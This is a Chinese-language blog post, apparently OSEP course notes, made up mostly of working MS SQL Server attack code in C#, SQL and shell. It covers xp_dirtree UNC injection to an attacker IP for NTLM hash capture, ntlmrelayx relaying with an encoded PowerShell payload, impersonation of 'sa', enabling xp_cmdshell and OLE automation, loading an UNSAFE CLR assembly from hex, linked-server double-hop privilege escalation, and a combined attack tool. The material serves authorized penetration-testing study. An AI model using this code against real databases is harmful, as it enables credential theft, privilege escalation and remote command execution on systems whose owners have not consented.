---
title: OSEP-15-MSSQL攻击代码
description: '15-MSSQL攻击 | 02-MSSQL攻击代码'
pubDate: 2026-01-30T00:02:25+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Exploit Development
  - SQL Injection
---

# MS SQL攻击代码详解

## 1. C#连接MS SQL Server

### 基本连接代码
```csharp
using System;
using System.Data.SqlClient;

namespace SQLConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            // 目标SQL Server
            String sqlServer = "dc01.corp.com";
            String database = "master";

            // 使用Windows集成认证
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            // 获取登录信息
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            // 获取映射用户
            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to the user: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}
```

---

## 2. 检查用户权限

### 检查角色成员身份
```csharp
// 检查public角色
String querypublic = "SELECT IS_SRVROLEMEMBER('public');";
command = new SqlCommand(querypublic, con);
reader = command.ExecuteReader();
reader.Read();
Int32 role = Int32.Parse(reader[0].ToString());
if (role == 1)
{
    Console.WriteLine("User is a member of public role");
}
else
{
    Console.WriteLine("User is NOT a member of public role");
}
reader.Close();

// 检查sysadmin角色
String querysysadmin = "SELECT IS_SRVROLEMEMBER('sysadmin');";
command = new SqlCommand(querysysadmin, con);
reader = command.ExecuteReader();
reader.Read();
role = Int32.Parse(reader[0].ToString());
if (role == 1)
{
    Console.WriteLine("User is a member of sysadmin role");
}
else
{
    Console.WriteLine("User is NOT a member of sysadmin role");
}
reader.Close();
```

---

## 3. UNC路径注入捕获哈希

### 使用xp_dirtree触发SMB连接
```csharp
// 触发UNC路径访问
String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();
Console.WriteLine("UNC path triggered!");
```

### 使用Responder捕获哈希
```bash
# 在Kali上启动Responder
sudo responder -I eth0

# 等待SQL Server连接
# 捕获Net-NTLM哈希
```

---

## 4. NTLM中继攻击

### 使用ntlmrelayx进行中继
```bash
# 启动ntlmrelayx
sudo impacket-ntlmrelayx --no-http-server -smb2support -t smb://192.168.120.6 -c "powershell -enc <UTF16LE_BASE64>"

# 触发SQL Server的SMB连接
# 中继到目标服务器执行命令
```

### 完整中继攻击代码
```csharp
using System;
using System.Data.SqlClient;

namespace SQLRelay
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);
            con.Open();

            // 触发到攻击者的SMB连接
            // ntlmrelayx会中继到目标
            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\relay\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
```

---

## 5. 模拟权限提升

### 检查可模拟的登录
```csharp
// 查询可模拟的登录
String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("Can impersonate: " + reader[0]);
}
reader.Close();
```

### 执行模拟
```csharp
// 模拟sa用户
String query = "EXECUTE AS LOGIN = 'sa';";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

// 验证当前身份
query = "SELECT SYSTEM_USER;";
command = new SqlCommand(query, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Now logged in as: " + reader[0]);
reader.Close();

// 检查是否为sysadmin
query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
command = new SqlCommand(query, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Is sysadmin: " + reader[0]);
reader.Close();
```

---

## 6. xp_cmdshell命令执行

### 启用xp_cmdshell
```csharp
// 启用高级选项
String enable1 = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;";
SqlCommand command = new SqlCommand(enable1, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

// 启用xp_cmdshell
String enable2 = "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
command = new SqlCommand(enable2, con);
reader = command.ExecuteReader();
reader.Close();

Console.WriteLine("xp_cmdshell enabled!");
```

### 执行系统命令
```csharp
// 执行whoami
String execCmd = "EXEC xp_cmdshell 'whoami';";
SqlCommand command = new SqlCommand(execCmd, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("Output: " + reader[0]);
}
reader.Close();
```

---

## 7. sp_OACreate命令执行

### 使用OLE自动化执行命令
```csharp
// 启用OLE自动化
String enable = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
SqlCommand command = new SqlCommand(enable, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

// 创建Shell对象并执行命令
String execCmd = @"
DECLARE @myshell INT;
EXEC sp_OACreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_OAMethod @myshell, 'Run', null, 'cmd /c ""whoami > C:\\Windows\\Tasks\\output.txt""';
";
command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
reader.Close();

Console.WriteLine("Command executed via sp_OACreate!");
```

---

## 8. 自定义程序集执行

### 创建CLR程序集
```csharp
// C# DLL代码
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();
        proc.WaitForExit();
        proc.Close();
    }
}
```

### 注册程序集
```sql
-- 启用CLR
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- 设置数据库为可信
ALTER DATABASE master SET TRUSTWORTHY ON;

-- 创建程序集
CREATE ASSEMBLY myAssembly FROM 'C:\path\to\assembly.dll' WITH PERMISSION_SET = UNSAFE;

-- 创建存储过程
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000)
AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

-- 执行命令
EXEC cmdExec 'whoami';
```

### 使用十六进制嵌入程序集（无需文件落地）
```csharp
// 将DLL转换为十六进制字符串
byte[] file = File.ReadAllBytes(@"C:\path\to\assembly.dll");
StringBuilder hex = new StringBuilder(file.Length * 2);
foreach (byte b in file)
{
    hex.AppendFormat("0x{0:x2}", b);
}
Console.WriteLine(hex.ToString());
```

```sql
-- 使用十六进制创建程序集（无需文件落地）
CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000... WITH PERMISSION_SET = UNSAFE;

-- 创建存储过程
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000)
AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

-- 执行命令
EXEC cmdExec 'whoami';
```

### 完整的十六进制程序集注入代码
```csharp
// 启用CLR和创建程序集
String enableCLR = @"
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
ALTER DATABASE master SET TRUSTWORTHY ON;
";
SqlCommand cmd = new SqlCommand(enableCLR, con);
cmd.ExecuteNonQuery();

// 使用十六进制创建程序集
String createAssembly = @"
CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000...
WITH PERMISSION_SET = UNSAFE;
";
cmd = new SqlCommand(createAssembly, con);
cmd.ExecuteNonQuery();

// 创建存储过程
String createProc = @"
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000)
AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
";
cmd = new SqlCommand(createProc, con);
cmd.ExecuteNonQuery();

// 执行命令
String execCmd = "EXEC cmdExec 'whoami';";
cmd = new SqlCommand(execCmd, con);
SqlDataReader reader = cmd.ExecuteReader();
while (reader.Read())
{
    Console.WriteLine(reader[0]);
}
reader.Close();
```

---

## 9. 链接服务器利用

### 枚举链接服务器
```csharp
// 列出链接服务器
String query = "EXEC sp_linkedservers;";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("Linked SQL server: " + reader[0]);
}
reader.Close();
```

### 通过链接服务器执行查询
```csharp
// 使用OPENQUERY
String query = "SELECT * FROM OPENQUERY(\"DC01\", 'SELECT @@servername');";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("Remote server: " + reader[0]);
}
reader.Close();
```

### 通过链接服务器执行命令
```csharp
// 在链接服务器上执行xp_cmdshell
String query = "EXEC ('xp_cmdshell ''whoami''') AT DC01;";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("Output: " + reader[0]);
}
reader.Close();
```

### 嵌套链接服务器
```csharp
// 双跳攻击
String query = "SELECT * FROM OPENQUERY(\"SERVER1\", 'SELECT * FROM OPENQUERY(\"SERVER2\", ''SELECT @@servername'')');";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("Remote server: " + reader[0]);
}
reader.Close();
```

### 双向链接权限提升
```
双向链接攻击原理:
├── SERVER1 链接到 SERVER2 (低权限)
├── SERVER2 链接回 SERVER1 (高权限)
├── 通过双跳可以获得更高权限
└── 常见于配置不当的环境
```

```csharp
// 检查双向链接
// 1. 在SERVER1上检查链接到SERVER2
String query1 = "SELECT * FROM OPENQUERY(\"SERVER2\", 'SELECT SYSTEM_USER');";

// 2. 在SERVER2上检查链接回SERVER1
String query2 = "SELECT * FROM OPENQUERY(\"SERVER2\", 'SELECT * FROM OPENQUERY(\"SERVER1\", ''SELECT SYSTEM_USER'')');";

// 3. 如果返回的用户权限更高，可以利用
// 例如：在SERVER1上是普通用户，但通过双跳回来变成sa

// 完整利用代码
String exploitQuery = @"
SELECT * FROM OPENQUERY(""SERVER2"", '
    SELECT * FROM OPENQUERY(""SERVER1"", ''
        EXEC sp_configure ''''show advanced options'''', 1;
        RECONFIGURE;
        EXEC sp_configure ''''xp_cmdshell'''', 1;
        RECONFIGURE;
        EXEC xp_cmdshell ''''whoami'''';
    '')
');
";
SqlCommand cmd = new SqlCommand(exploitQuery, con);
SqlDataReader reader = cmd.ExecuteReader();
while (reader.Read())
{
    Console.WriteLine(reader[0]);
}
reader.Close();
```

### 链接服务器权限检查
```csharp
// 检查在链接服务器上的权限
String checkQuery = @"
SELECT * FROM OPENQUERY(""LINKEDSERVER"", '
    SELECT IS_SRVROLEMEMBER(''''sysadmin'''')
');
";
SqlCommand cmd = new SqlCommand(checkQuery, con);
SqlDataReader reader = cmd.ExecuteReader();
reader.Read();
Console.WriteLine("Is sysadmin on linked server: " + reader[0]);
reader.Close();
```

---

## 10. 完整攻击工具

### 综合SQL攻击工具
```csharp
using System;
using System.Data.SqlClient;

namespace SQLAttack
{
    class Program
    {
        static SqlConnection con;

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: SQLAttack.exe <server> [command]");
                return;
            }

            String sqlServer = args[0];
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

            con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Connected to " + sqlServer);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Connection failed: " + e.Message);
                return;
            }

            // 显示登录信息
            ShowLoginInfo();

            // 检查权限
            CheckPermissions();

            // 枚举链接服务器
            EnumLinkedServers();

            // 如果提供了命令，尝试执行
            if (args.Length > 1)
            {
                ExecuteCommand(args[1]);
            }

            con.Close();
        }

        static void ShowLoginInfo()
        {
            String query = "SELECT SYSTEM_USER;";
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Logged in as: " + reader[0]);
            reader.Close();
        }

        static void CheckPermissions()
        {
            String query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            reader.Read();
            if (reader[0].ToString() == "1")
            {
                Console.WriteLine("[+] User is sysadmin!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT sysadmin");
            }
            reader.Close();
        }

        static void EnumLinkedServers()
        {
            String query = "EXEC sp_linkedservers;";
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            Console.WriteLine("[*] Linked servers:");
            while (reader.Read())
            {
                Console.WriteLine("    - " + reader[0]);
            }
            reader.Close();
        }

        static void ExecuteCommand(String command)
        {
            try
            {
                // 启用xp_cmdshell
                String enable = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                SqlCommand cmd = new SqlCommand(enable, con);
                cmd.ExecuteNonQuery();

                // 执行命令
                String exec = "EXEC xp_cmdshell '" + command + "';";
                cmd = new SqlCommand(exec, con);
                SqlDataReader reader = cmd.ExecuteReader();
                Console.WriteLine("[+] Command output:");
                while (reader.Read())
                {
                    if (reader[0] != DBNull.Value)
                        Console.WriteLine(reader[0]);
                }
                reader.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Command execution failed: " + e.Message);
            }
        }
    }
}
```

---

## 常用SQL查询速查

| 查询 | 说明 |
|------|------|
| `SELECT SYSTEM_USER` | 当前登录名 |
| `SELECT USER_NAME()` | 当前数据库用户 |
| `SELECT @@servername` | 服务器名称 |
| `SELECT IS_SRVROLEMEMBER('sysadmin')` | 检查sysadmin |
| `EXEC sp_linkedservers` | 列出链接服务器 |
| `EXEC xp_cmdshell 'cmd'` | 执行系统命令 |
| `EXEC xp_dirtree '\\ip\share'` | 触发SMB连接 |
| `EXECUTE AS LOGIN = 'sa'` | 模拟登录 |
